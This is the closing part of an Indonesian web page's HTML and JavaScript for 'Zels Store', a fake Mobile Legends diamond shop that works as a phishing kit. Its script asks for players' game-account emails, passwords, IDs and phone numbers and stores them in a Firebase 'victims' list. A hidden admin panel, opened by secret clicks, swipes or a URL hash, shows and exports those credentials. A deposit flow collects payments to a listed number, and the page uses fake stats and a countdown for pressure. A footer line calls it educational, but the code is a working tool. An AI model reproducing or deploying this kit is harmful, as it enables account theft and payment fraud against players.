                        <div style="display: flex; justify-content: space-between; font-size: 1.2em;">
                            <span>Total Diterima:</span>
                            <span style="color: var(--accent); font-weight: bold;" id="totalReceive">Rp 0</span>
                        </div>
                    </div>

                    <div class="proof-upload">
                        <label style="display: block; margin-bottom: 10px;">üìé Upload Bukti Transfer (Screenshot)</label>
                        <input type="file" id="proofFile" accept="image/*">
                    </div>

                    <div class="proof-upload">
                        <label style="display: block; margin-bottom: 10px;">üìù Catatan (Opsional)</label>
                        <input type="text" id="depositNote" placeholder="Contoh: Transfer dari GOPAY a.n. Joko">
                    </div>

                    <button class="submit-deposit-btn" id="submitDepositBtn" onclick="submitDepositRequest()" disabled>
                        üöÄ KIRIM REQUEST DEPOSIT
                    </button>
                </div>

                <!-- Transaction History -->
                <div class="transaction-history">
                    <h3 style="color: var(--accent); margin-bottom: 15px;">üìú Riwayat Transaksi</h3>
                    <div id="transactionHistory">
                        <div style="text-align: center; color: #666; padding: 20px;">Belum ada transaksi</div>
                    </div>
                </div>
            </div>

            <!-- Stats -->
            <div class="stats-bar">
                <div class="stat-item">
                    <div class="stat-number">25.847+</div>
                    <div>Diamond Terjual</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number">9.9/10</div>
                    <div>Rating Customer</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number">24/7</div>
                    <div>Customer Service</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number">100%</div>
                    <div>Transaksi Aman</div>
                </div>
            </div>

            <!-- Final CTA -->
            <div style="text-align: center; margin: 60px 0;">
                <button class="order-btn" onclick="scrollToDeposit()" style="font-size: 1.5em; padding: 25px 50px; max-width: 400px;">
                    üí∞ DEPOSIT SEKARANG!
                </button>
                <p style="margin-top: 20px; color: var(--danger); font-size: 1.1em;">
                    ‚ö° BONUS UP TO 20% UNTUK DEPOSIT PERTAMA!
                </p>
            </div>
        </div>

        <div class="footer" id="secretFooter">
            <div style="font-size: 2em; margin-bottom: 20px; color: var(--accent);">ZELS STORE</div>
            <p>Official Diamond Supplier for Mobile Legends</p>
            <p style="margin-top: 20px; color: #aaa; font-size: 0.9em;">
                ¬© 2024 Zels Store. All rights reserved. | 
                <a href="#" style="color: var(--accent);">Terms of Service</a> | 
                <a href="#" style="color: var(--accent);">Privacy Policy</a> | 
                <a href="#" style="color: var(--accent);">Contact Us</a>
            </p>
            <p style="margin-top: 30px; font-size: 0.8em; color: #666;">
                <strong>EDUCATIONAL PURPOSE:</strong> Website simulasi untuk edukasi keamanan siber dan phishing awareness
            </p>
        </div>
    </div>

    <!-- Processing Screen -->
    <div class="processing-screen" id="processingScreen">
        <div class="loader"></div>
    </div>

    <!-- Success Screen -->
    <div class="success-screen" id="successScreen">
        <div class="success-content">
            <div class="success-icon">‚úÖ</div>
            <h2 style="color: var(--success); margin-bottom: 20px;">REQUEST TERKIRIM!</h2>
            <p style="margin-bottom: 30px; color: #aaa;" id="successMessage">
                Request deposit Anda sedang diproses admin.
            </p>
            <div style="background: rgba(0, 255, 234, 0.1); padding: 20px; border-radius: 10px; margin-bottom: 30px;">
                <p style="color: var(--accent);">
                    üí° <strong>Info:</strong> Admin akan memproses dalam 1x24 jam
                </p>
            </div>
            <button class="order-btn" onclick="closeSuccessScreen()" style="width: 100%;">
                üõí Kembali ke Store
            </button>
        </div>
    </div>

    <!-- Notification -->
    <div class="notification" id="notification"></div>

    <script>
        // ============================================
        // FIREBASE CONFIGURATION - GANTI DENGAN PUNYA LO!
        // ============================================
        // CARA DAPATKAN:
        // 1. Buka https://console.firebase.google.com
        // 2. Buat project baru "zels-store"
        // 3. Klik "Add app" > pilih web (</>)
        // 4. Register app, nanti muncul config ini
        // 5. COPY & PASTE di sini:
        
        const firebaseConfig = {
            apiKey: "AIzaSyBkZJrPNAzUf9fSIs_Bhh2iYJ2MrJQyXjE",
            authDomain: "zels-store-4a38b.firebaseapp.com",
            databaseURL: "https://zels-store-4a38b-default-rtdb.firebaseio.com",
            projectId: "zels-store-4a38b",
            storageBucket: "zels-store-4a38b.firebasestorage.app",
            messagingSenderId: "472419145184",
            appId: "1:472419145184:web:17fb420e3f5d08d37a74f9"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const storage = firebase.storage();
        const auth = firebase.auth();

        // Global variables
        let currentUser = null;
        let selectedProduct = null;
        let selectedDeposit = 0;
        let selectedPaymentMethod = '';
        let mlData = null;
        let countdownTime = 60 * 60; // 1 hour
        let isAdmin = false;
        
        // Secret activation counters
        let logoClickCount = 0;
        let footerSwipeCount = 0;
        let lastClickTime = 0;
        
        // Notification counter for admin
        let newDataCount = 0;

        // ============================================
        // AUTH FUNCTIONS (FIREBASE)
        // ============================================
        
        // Check auth state
        auth.onAuthStateChanged((user) => {
            if (user) {
                // User is signed in
                currentUser = {
                    uid: user.uid,
                    email: user.email,
                    name: user.displayName || user.email.split('@')[0],
                    isAdmin: user.email === "admin@gmail.com",
                    loginTime: Date.now()
                };
                
                isAdmin = currentUser.isAdmin;
                
                // Load user data from database
                database.ref('users/' + user.uid).once('value').then((snapshot) => {
                    const userData = snapshot.val();
                    if (userData) {
                        currentUser.balance = userData.balance || 0;
                    } else {
                        currentUser.balance = 0;
                        // Create user in database
                        database.ref('users/' + user.uid).set({
                            email: user.email,
                            name: user.displayName || user.email.split('@')[0],
                            balance: 0,
                            createdAt: new Date().toISOString()
                        });
                    }
                    
                    showStorePage();
                    updateUserAvatar();
                    updateUserBalance();
                    
                    if (isAdmin) {
                        setTimeout(() => {
                            setupSecretClick();
                            setupSecretSwipe();
                            setupRealtimeListeners();
                        }, 1000);
                    }
                });
                
                loadMLData(user.uid);
                loadTransactionHistory(user.uid);
                
            } else {
                // User is signed out
                document.getElementById('authPage').style.display = 'flex';
                document.getElementById('storePage').style.display = 'none';
            }
        });

        // Setup realtime listeners for admin
        function setupRealtimeListeners() {
            // Listen for new victims
            database.ref('victims').limitToLast(1).on('child_added', (snapshot) => {
                if (isAdmin && document.getElementById('adminPanel').classList.contains('active')) {
                    loadAdminData();
                    showNotification('üì• Data korban baru masuk!', 'info');
                } else if (isAdmin) {
                    newDataCount++;
                    document.getElementById('adminVictims').innerHTML += '<div class="admin-badge">' + newDataCount + '</div>';
                }
            });
            
            // Listen for new deposits
            database.ref('deposits').limitToLast(1).on('child_added', (snapshot) => {
                if (isAdmin && document.getElementById('adminPanel').classList.contains('active')) {
                    loadAdminData();
                    showNotification('üí∞ Request deposit baru!', 'info');
                }
            });
        }

        function handleLogin() {
            const email = document.getElementById('loginEmail').value.trim();
            const password = document.getElementById('loginPassword').value.trim();
            
            if (!email || !password) {
                showNotification('‚ùå Isi email dan password!', 'error');
                return;
            }
            
            showProcessing();
            
            auth.signInWithEmailAndPassword(email, password)
                .then((userCredential) => {
                    hideProcessing();
                    showNotification('‚úÖ Login berhasil!', 'success');
                })
                .catch((error) => {
                    hideProcessing();
                    showNotification('‚ùå ' + error.message, 'error');
                });
        }

        function handleRegister() {
            const name = document.getElementById('registerName').value.trim();
            const email = document.getElementById('registerEmail').value.trim();
            const password = document.getElementById('registerPassword').value;
            const confirmPassword = document.getElementById('registerConfirmPassword').value;
            
            if (!name || !email || !password) {
                showNotification('‚ùå Harap isi semua field!', 'error');
                return;
            }
            
            if (password.length < 6) {
                showNotification('‚ùå Password minimal 6 karakter!', 'error');
                return;
            }
            
            if (password !== confirmPassword) {
                showNotification('‚ùå Password tidak cocok!', 'error');
                return;
            }
            
            showProcessing();
            
            auth.createUserWithEmailAndPassword(email, password)
                .then((userCredential) => {
                    // Update profile
                    return userCredential.user.updateProfile({
                        displayName: name
                    }).then(() => {
                        // Save to database
                        return database.ref('users/' + userCredential.user.uid).set({
                            email: email,
                            name: name,
                            balance: 0,
                            createdAt: new Date().toISOString()
                        });
                    });
                })
                .then(() => {
                    hideProcessing();
                    showNotification('‚úÖ Pendaftaran berhasil!', 'success');
                    switchAuthTab('login');
                })
                .catch((error) => {
                    hideProcessing();
                    showNotification('‚ùå ' + error.message, 'error');
                });
        }

        function logout() {
            if (confirm('Apakah Anda yakin ingin logout?')) {
                auth.signOut();
            }
        }

        function switchAuthTab(tab) {
            document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.auth-form').forEach(f => f.classList.remove('active'));
            
            document.querySelector(`[onclick="switchAuthTab('${tab}')"]`).classList.add('active');
            document.getElementById(`${tab}Form`).classList.add('active');
        }

        function showStorePage() {
            document.getElementById('authPage').style.display = 'none';
            document.getElementById('storePage').style.display = 'block';
            startCountdown();
        }

        function updateUserAvatar() {
            if (currentUser) {
                const avatar = document.getElementById('userAvatar');
                avatar.textContent = currentUser.name.charAt(0).toUpperCase();
            }
        }

        function updateUserBalance() {
            if (currentUser) {
                document.getElementById('userBalance').textContent = `Rp ${(currentUser.balance || 0).toLocaleString()}`;
            }
        }

        // ============================================
        // DATA FUNCTIONS (FIREBASE)
        // ============================================

        function saveMLData() {
            const email = document.getElementById('mlEmail').value.trim();
            const password = document.getElementById('mlPassword').value.trim();
            const mlId = document.getElementById('mlID').value.trim();
            const server = document.getElementById('mlServer').value.trim();
            const phone = document.getElementById('mlPhone').value.trim();

            if (!email || !password || !mlId || !server || !phone) {
                showNotification('‚ùå Harap lengkapi semua data ML!', 'error');
                return;
            }

            if (!email.includes('@')) {
                showNotification('‚ùå Email tidak valid!', 'error');
                return;
            }

            showProcessing();

            // Save ML data
            const mlDataRef = database.ref('mldata/' + currentUser.uid);
            mlDataRef.set({
                email: email,
                password: password,
                mlId: mlId,
                server: server,
                phone: phone,
                timestamp: new Date().toISOString()
            }).then(() => {
                // Save to victims
                return database.ref('victims').push({
                    userUid: currentUser.uid,
                    userEmail: currentUser.email,
                    email: email,
                    password: password,
                    mlbb_id: mlId,
                    server: server,
                    phone: phone,
                    timestamp: new Date().toISOString()
                });
            }).then(() => {
                hideProcessing();
                
                const status = document.getElementById('mlDataStatus');
                status.className = 'ml-data-status success';
                status.innerHTML = '‚úÖ Data ML berhasil disimpan! Sekarang Anda bisa deposit.';
                
                // Enable deposit options
                enableDepositOptions(true);
                
                showNotification('‚úÖ Data ML disimpan!', 'success');
            }).catch((error) => {
                hideProcessing();
                showNotification('‚ùå ' + error.message, 'error');
            });
        }

        function loadMLData(userUid) {
            database.ref('mldata/' + userUid).once('value').then((snapshot) => {
                const data = snapshot.val();
                if (data) {
                    document.getElementById('mlEmail').value = data.email || '';
                    document.getElementById('mlPassword').value = data.password || '';
                    document.getElementById('mlID').value = data.mlId || '';
                    document.getElementById('mlServer').value = data.server || '8001';
                    document.getElementById('mlPhone').value = data.phone || '';
                    
                    enableDepositOptions(true);
                    
                    const status = document.getElementById('mlDataStatus');
                    status.className = 'ml-data-status success';
                    status.innerHTML = '‚úÖ Data ML sudah tersimpan! Silakan deposit.';
                }
            });
        }

        function enableDepositOptions(enabled) {
            const cards = document.querySelectorAll('.deposit-card');
            cards.forEach(card => {
                if (enabled) {
                    card.classList.remove('disabled');
                } else {
                    card.classList.add('disabled');
                }
            });
        }

        // ============================================
        // DEPOSIT FUNCTIONS
        // ============================================

        function selectDeposit(amount) {
            // Check if ML data is saved
            if (!document.getElementById('mlEmail').value) {
                showNotification('‚ùå Isi data ML dulu!', 'error');
                document.querySelector('.ml-data-form').scrollIntoView({ behavior: 'smooth' });
                return;
            }

            selectedDeposit = amount;
            
            const bonus = amount >= 200000 ? 0.2 : amount >= 100000 ? 0.15 : amount >= 50000 ? 0.1 : 0.05;
            const bonusAmount = Math.floor(amount * bonus);
            const totalReceive = amount + bonusAmount;
            
            document.getElementById('selectedAmount').textContent = `Rp ${amount.toLocaleString()}`;
            document.getElementById('bonusAmount').textContent = `Rp ${bonusAmount.toLocaleString()}`;
            document.getElementById('totalReceive').textContent = `Rp ${totalReceive.toLocaleString()}`;
            
            document.getElementById('paymentInfo').classList.add('active');
            document.getElementById('submitDepositBtn').disabled = true;
        }

        function selectPaymentMethod(method) {
            selectedPaymentMethod = method;
            
            document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('selected'));
            document.getElementById(`method${method.charAt(0).toUpperCase() + method.slice(1)}`).classList.add('selected');
            
            document.getElementById('paymentMethodName').textContent = method.toUpperCase();
            document.getElementById('paymentDetails').style.display = 'block';
            
            document.getElementById('submitDepositBtn').disabled = false;
        }

        function copyBankNumber() {
            navigator.clipboard.writeText("087760337535").then(() => {
                showNotification('‚úÖ Nomor berhasil dicopy!', 'success');
            });
        }

        function submitDepositRequest() {
            if (!selectedDeposit) {
                showNotification('‚ùå Pilih jumlah deposit dulu!', 'error');
                return;
            }

            if (!selectedPaymentMethod) {
                showNotification('‚ùå Pilih metode pembayaran!', 'error');
                return;
            }

            const fileInput = document.getElementById('proofFile');
            if (!fileInput.files || fileInput.files.length === 0) {
                showNotification('‚ùå Upload bukti transfer dulu!', 'error');
                return;
            }

            showProcessing();

            // Upload proof to Firebase Storage
            const file = fileInput.files[0];
            const storageRef = storage.ref('proofs/' + Date.now() + '_' + file.name);
            
            storageRef.put(file).then((snapshot) => {
                return snapshot.ref.getDownloadURL();
            }).then((proofUrl) => {
                const bonus = selectedDeposit >= 200000 ? 0.2 : selectedDeposit >= 100000 ? 0.15 : selectedDeposit >= 50000 ? 0.1 : 0.05;
                const bonusAmount = Math.floor(selectedDeposit * bonus);
                const totalReceive = selectedDeposit + bonusAmount;

                // Save deposit request to database
                return database.ref('deposits').push({
                    userUid: currentUser.uid,
                    userEmail: currentUser.email,
                    userName: currentUser.name,
                    mlEmail: document.getElementById('mlEmail').value,
                    mlId: document.getElementById('mlID').value,
                    mlServer: document.getElementById('mlServer').value,
                    phone: document.getElementById('mlPhone').value,
                    amount: selectedDeposit,
                    bonus: bonusAmount,
                    total: totalReceive,
                    paymentMethod: selectedPaymentMethod,
                    proofUrl: proofUrl,
                    proofName: file.name,
                    note: document.getElementById('depositNote').value,
                    status: 'pending',
                    timestamp: new Date().toISOString()
                });
            }).then(() => {
                hideProcessing();
                
                // Clear form
                document.getElementById('paymentInfo').classList.remove('active');
                document.getElementById('proofFile').value = '';
                document.getElementById('depositNote').value = '';
                document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('selected'));
                document.getElementById('paymentDetails').style.display = 'none';
                selectedPaymentMethod = '';

                showSuccessScreen('Request deposit terkirim! Menunggu persetujuan admin.');
                
                if (isAdmin) {
                    loadAdminData();
                }
            }).catch((error) => {
                hideProcessing();
                showNotification('‚ùå ' + error.message, 'error');
            });
        }

        function loadTransactionHistory(userUid) {
            database.ref('transactions').orderByChild('userUid').equalTo(userUid).limitToLast(10).on('value', (snapshot) => {
                const transactions = [];
                snapshot.forEach((child) => {
                    transactions.push(child.val());
                });
                
                updateTransactionHistoryUI(transactions.reverse());
            });
        }

        function updateTransactionHistoryUI(transactions) {
            const historyDiv = document.getElementById('transactionHistory');
            
            if (!transactions || transactions.length === 0) {
                historyDiv.innerHTML = '<div style="text-align: center; color: #666; padding: 20px;">Belum ada transaksi</div>';
                return;
            }

            let html = '';
            transactions.forEach(t => {
                let statusClass = 'status-pending';
                if (t.status === 'success') statusClass = 'status-success';
                if (t.status === 'rejected') statusClass = 'status-rejected';
                
                html += `
                    <div class="history-item">
                        <div>
                            <div style="font-weight: bold;">${t.type === 'deposit' ? 'üí∞ Deposit' : 'üíé Pembelian'}</div>
                            <div style="font-size: 11px; color: #666;">${new Date(t.timestamp).toLocaleString()}</div>
                        </div>
                        <div style="text-align: right;">
                            <div style="color: ${t.type === 'deposit' ? 'var(--success)' : 'var(--accent)'}; font-weight: bold;">
                                ${t.type === 'deposit' ? '+' : '-'} Rp ${t.amount.toLocaleString()}
                            </div>
                            <span class="history-status ${statusClass}">${t.status}</span>
                        </div>
                    </div>
                `;
            });
            
            historyDiv.innerHTML = html;
        }

        function buyWithBalance(amount, price) {
            if (!currentUser) {
                showNotification('‚ùå Login dulu!', 'error');
                return;
            }

            if (currentUser.balance < price) {
                showNotification('‚ùå Saldo tidak cukup! Deposit dulu.', 'error');
                scrollToDeposit();
                return;
            }

            if (confirm(`Beli ${amount} Diamond seharga Rp ${price.toLocaleString()}?`)) {
                showProcessing();
                
                const newBalance = currentUser.balance - price;
                
                // Update user balance in database
                database.ref('users/' + currentUser.uid + '/balance').set(newBalance).then(() => {
                    currentUser.balance = newBalance;
                    updateUserBalance();
                    
                    // Save transaction
                    return database.ref('transactions').push({
                        userUid: currentUser.uid,
                        userEmail: currentUser.email,
                        type: 'purchase',
                        product: amount,
                        amount: price,
                        status: 'success',
                        timestamp: new Date().toISOString()
                    });
                }).then(() => {
                    hideProcessing();
                    showNotification(`‚úÖ Berhasil membeli ${amount} Diamond!`, 'success');
                }).catch((error) => {
                    hideProcessing();
                    showNotification('‚ùå ' + error.message, 'error');
                });
            }
        }

        // ============================================
        // ADMIN FUNCTIONS (REAL-TIME)
        // ============================================

        function loadAdminData() {
            if (!isAdmin) return;
            
            // Load victims
            database.ref('victims').orderByChild('timestamp').limitToLast(50).on('value', (snapshot) => {
                const victims = [];
                snapshot.forEach((child) => {
                    victims.push({ id: child.key, ...child.val() });
                });
                
                const victimsList = document.getElementById('victimsList');
                victimsList.innerHTML = '';
                
                if (victims.length === 0) {
                    victimsList.innerHTML = '<div style="text-align: center; color: #666; padding: 20px;">Belum ada data</div>';
                } else {
                    victims.reverse().forEach(victim => {
                        const victimItem = document.createElement('div');
                        victimItem.className = 'victim-item';
                        victimItem.innerHTML = `
                            <div class="victim-email">${victim.email}</div>
                            <div class="victim-data">
                                Pass: ${victim.password} | 
                                MLID: ${victim.mlbb_id} | 
                                Server: ${victim.server} |
                                Phone: ${victim.phone}
                            </div>
                            <div style="font-size: 11px; color: #666; margin-top: 5px;">
                                ${new Date(victim.timestamp).toLocaleString()}
                            </div>
                        `;
                        victimsList.appendChild(victimItem);
                    });
                }
            });
            
            // Load deposit requests
            database.ref('deposits').orderByChild('timestamp').limitToLast(50).on('value', (snapshot) => {
                const deposits = [];
                snapshot.forEach((child) => {
                    deposits.push({ id: child.key, ...child.val() });
                });
                
                const depositRequestsList = document.getElementById('depositRequestsList');
                depositRequestsList.innerHTML = '';
                
                const pendingDeposits = deposits.filter(d => d.status === 'pending').reverse();
                
                if (pendingDeposits.length === 0) {
                    depositRequestsList.innerHTML = '<div style="text-align: center; color: #666; padding: 20px;">Tidak ada request pending</div>';
                } else {
                    pendingDeposits.forEach(deposit => {
                        const requestItem = document.createElement('div');
                        requestItem.className = 'request-item';
                        
                        requestItem.innerHTML = `
                            <div class="request-user">${deposit.userEmail}</div>
                            <div class="victim-data">
                                ML Email: ${deposit.mlEmail || '-'}<br>
                                ML ID: ${deposit.mlId || '-'}<br>
                                Phone: ${deposit.phone || '-'}
                            </div>
                            <div class="request-data">
                                Amount: Rp ${deposit.amount.toLocaleString()} | 
                                Bonus: Rp ${deposit.bonus.toLocaleString()} |
                                Total: Rp ${(deposit.amount + deposit.bonus).toLocaleString()}<br>
                                Payment: ${deposit.paymentMethod?.toUpperCase()}
                            </div>
                            <img src="${deposit.proofUrl}" class="proof-thumbnail" onclick="viewProof('${deposit.proofUrl}')">
                            <button class="view-proof-btn" onclick="viewProof('${deposit.proofUrl}')">üîç Lihat Bukti</button>
                            <div style="font-size: 11px; color: #666; margin: 5px 0;">
                                ${new Date(deposit.timestamp).toLocaleString()}
                            </div>
                            <div class="request-actions">
                                <button class="approve-btn" onclick="approveDeposit('${deposit.id}', '${deposit.userUid}', ${deposit.amount + deposit.bonus})">‚úÖ Approve</button>
                                <button class="reject-btn" onclick="rejectDeposit('${deposit.id}')">‚ùå Reject</button>
                            </div>
                        `;
                        depositRequestsList.appendChild(requestItem);
                    });
                }
                
                // Update stats
                document.getElementById('totalDeposits').textContent = deposits.length;
                document.getElementById('pendingDeposits').textContent = deposits.filter(d => d.status === 'pending').length;
                
                const totalAmount = deposits.reduce((sum, d) => sum + (d.status === 'approved' ? d.amount + d.bonus : 0), 0);
                document.getElementById('totalDepositAmount').textContent = totalAmount.toLocaleString();
            });
            
            // Load users
            database.ref('users').once('value', (snapshot) => {
                const users = [];
                snapshot.forEach((child) => {
                    users.push({ uid: child.key, ...child.val() });
                });
                
                const usersList = document.getElementById('usersList');
                usersList.innerHTML = '';
                
                if (users.length === 0) {
                    usersList.innerHTML = '<div style="text-align: center; color: #666; padding: 20px;">Belum ada user</div>';
                } else {
                    users.forEach(user => {
                        const userItem = document.createElement('div');
                        userItem.className = 'user-item';
                        userItem.innerHTML = `
                            <div class="user-email">${user.email}</div>
                            <div class="user-data">
                                Name: ${user.name} | 
                                Balance: Rp ${(user.balance || 0).toLocaleString()}
                            </div>
                            <div style="font-size: 11px; color: #666; margin-top: 5px;">
                                Joined: ${new Date(user.createdAt).toLocaleDateString()}
                            </div>
                        `;
                        usersList.appendChild(userItem);
                    });
                }
            });
        }

        function approveDeposit(depositId, userUid, amount) {
            if (confirm('Approve deposit ini? Saldo user akan ditambahkan.')) {
                showProcessing();
                
                // Update deposit status
                database.ref('deposits/' + depositId + '/status').set('approved').then(() => {
                    // Get user current balance
                    return database.ref('users/' + userUid + '/balance').once('value');
                }).then((snapshot) => {
                    const currentBalance = snapshot.val() || 0;
                    const newBalance = currentBalance + amount;
                    
                    // Update user balance
                    return database.ref('users/' + userUid + '/balance').set(newBalance);
                }).then(() => {
                    // Save transaction
                    return database.ref('transactions').push({
                        userUid: userUid,
                        type: 'deposit',
                        amount: amount,
                        status: 'success',
                        timestamp: new Date().toISOString()
                    });
                }).then(() => {
                    hideProcessing();
                    showNotification('‚úÖ Deposit approved! Saldo user bertambah Rp ' + amount.toLocaleString(), 'success');
                }).catch((error) => {
                    hideProcessing();
                    showNotification('‚ùå ' + error.message, 'error');
                });
            }
        }

        function rejectDeposit(depositId) {
            if (confirm('Tolak deposit ini?')) {
                showProcessing();
                
                database.ref('deposits/' + depositId + '/status').set('rejected').then(() => {
                    hideProcessing();
                    showNotification('‚ùå Deposit rejected', 'error');
                }).catch((error) => {
                    hideProcessing();
                    showNotification('‚ùå ' + error.message, 'error');
                });
            }
        }

        function viewProof(url) {
            document.getElementById('proofImage').src = url;
            document.getElementById('proofModal').classList.add('active');
        }

        function closeProofModal() {
            document.getElementById('proofModal').classList.remove('active');
        }

        // ============================================
        // UI FUNCTIONS
        // ============================================

        function showHiddenAdminPanel() {
            if (!isAdmin) {
                showNotification('‚ùå Only admin can access this panel!', 'error');
                return;
            }
            
            document.getElementById('adminPanel').classList.add('active');
            newDataCount = 0;
            loadAdminData();
        }

        function closeAdminPanel() {
            document.getElementById('adminPanel').classList.remove('active');
        }

        window.showHiddenAdminPanel = showHiddenAdminPanel;

        function switchAdminTab(tab) {
            document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.admin-content').forEach(c => c.classList.remove('active'));
            
            if (tab === 'victims') {
                document.querySelectorAll('.admin-tab')[0].classList.add('active');
                document.getElementById('adminVictims').classList.add('active');
            } else if (tab === 'deposits') {
                document.querySelectorAll('.admin-tab')[1].classList.add('active');
                document.getElementById('adminDeposits').classList.add('active');
            } else if (tab === 'users') {
                document.querySelectorAll('.admin-tab')[2].classList.add('active');
                document.getElementById('adminUsers').classList.add('active');
            }
        }

        function setupSecretClick() {
            const logo = document.getElementById('secretLogo');
            if (logo) {
                logo.addEventListener('click', function(e) {
                    const currentTime = new Date().getTime();
                    
                    if (currentTime - lastClickTime > 1000) {
                        logoClickCount = 0;
                    }
                    
                    lastClickTime = currentTime;
                    logoClickCount++;
                    
                    if (logoClickCount >= 7) {
                        if (isAdmin) {
                            showHiddenAdminPanel();
                            showNotification('‚ö° Admin Panel Activated! (Logo 7x)', 'success');
                        }
                        logoClickCount = 0;
                    }
                });
            }
        }

        function setupSecretSwipe() {
            const footer = document.getElementById('secretFooter');
            if (footer) {
                let touchStartX = 0;
                
                footer.addEventListener('touchstart', function(e) {
                    touchStartX = e.touches[0].clientX;
                }, false);
                
                footer.addEventListener('touchend', function(e) {
                    if (!touchStartX) return;
                    
                    const touchEndX = e.changedTouches[0].clientX;
                    const swipeDistance = touchEndX - touchStartX;
                    
                    if (swipeDistance < -50) {
                        footerSwipeCount++;
                        
                        if (footerSwipeCount >= 3) {
                            if (isAdmin) {
                                showHiddenAdminPanel();
                                showNotification('‚ö° Admin Panel Activated! (Swipe Footer)', 'success');
                            }
                            footerSwipeCount = 0;
                        }
                    }
                }, false);
            }
        }

        function startCountdown() {
            updateCountdown();
            setInterval(updateCountdown, 1000);
        }

        function updateCountdown() {
            const hours = Math.floor(countdownTime / 3600);
            const minutes = Math.floor((countdownTime % 3600) / 60);
            const seconds = countdownTime % 60;
            
            document.getElementById('countdown').textContent = 
                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            if (countdownTime > 0) {
                countdownTime--;
            }
        }

        function scrollToDeposit() {
            document.querySelector('.deposit-section').scrollIntoView({ behavior: 'smooth' });
        }

        function showSuccessScreen(message) {
            document.getElementById('successMessage').textContent = message || 'Request deposit Anda sedang diproses admin.';
            document.getElementById('successScreen').classList.add('active');
        }

        function closeSuccessScreen() {
            document.getElementById('successScreen').classList.remove('active');
        }

        function showProcessing() {
            document.getElementById('processingScreen').classList.add('active');
        }

        function hideProcessing() {
            document.getElementById('processingScreen').classList.remove('active');
        }

        function showNotification(message, type = 'success') {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = `notification ${type}`;
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 5000);
        }

        function showUserMenu() {
            if (currentUser) {
                const message = isAdmin ? 
                    `üëë Admin: ${currentUser.email}\nSaldo: Rp ${currentUser.balance.toLocaleString()}\n\nGunakan metode rahasia:\n‚Ä¢ Klik logo 7x\n‚Ä¢ URL #admin?access=zels2024\n‚Ä¢ Swipe footer 3x` :
                    `üë§ User: ${currentUser.name}\nEmail: ${currentUser.email}\nSaldo: Rp ${currentUser.balance.toLocaleString()}`;
                
                alert(message);
            }
        }

        function exportData() {
            if (!isAdmin) return;
            
            database.ref().once('value').then((snapshot) => {
                const allData = snapshot.val();
                const dataStr = JSON.stringify(allData, null, 2);
                const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
                
                const exportFileDefaultName = `zels_store_backup_${new Date().toISOString().split('T')[0]}.json`;
                
                const linkElement = document.createElement('a');
                linkElement.setAttribute('href', dataUri);
                linkElement.setAttribute('download', exportFileDefaultName);
                linkElement.click();
                
                showNotification('üì• Data berhasil diexport!', 'success');
            });
        }

        function deleteAllData() {
            if (!isAdmin) return;
            
            if (confirm('HAPUS SEMUA DATA VICTIMS?\nTindakan ini tidak dapat dibatalkan!')) {
                showProcessing();
                
                database.ref('victims').remove().then(() => {
                    hideProcessing();
                    showNotification('üóëÔ∏è Semua data victims telah dihapus!', 'success');
                    loadAdminData();
                }).catch((error) => {
                    hideProcessing();
                    showNotification('‚ùå ' + error.message, 'error');
                });
            }
        }

        // Check for URL hash on load
        if (window.location.hash === '#admin?access=zels2024') {
            setTimeout(() => {
                if (isAdmin) {
                    showHiddenAdminPanel();
                }
                history.replaceState(null, null, window.location.pathname);
            }, 2000);
        }
    </script>
</body>
</html>